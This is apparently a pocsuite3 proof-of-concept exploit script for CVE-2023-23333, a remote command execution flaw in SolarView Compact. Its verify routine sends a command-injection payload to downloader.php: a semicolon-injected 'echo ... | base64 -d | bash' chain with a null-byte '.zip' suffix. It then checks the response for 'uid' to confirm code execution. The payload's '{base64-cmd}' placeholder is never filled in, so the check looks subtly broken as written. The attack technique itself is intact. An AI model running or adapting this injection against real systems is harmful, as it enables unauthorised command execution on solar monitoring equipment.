# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = "CVE-2023-23333"
    version ='1'
    author = ["lmx"]
    vulDate = "2023"
    createDate = "2023-6-29"
    updateDate = "2023-6-29"
    references =[""]
    name ="SolarView Compact 6.00 - rce"
    appPowerLink = ''
    appName = 'SolarView'
    appVersion = '< 6.0'
    vulType = 'RCE'
    desc = '''
    远程命令执行
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result ={}
        poc = '''/downloader.php?file=;echo%20{base64-cmd}|base64%20-d|bash%00.zip'''
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
                    }
                    
        r = requests.get(url=self.url + poc, headers=headers, verify=False, timeout=10)

        try:
            if 'uid' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC) 
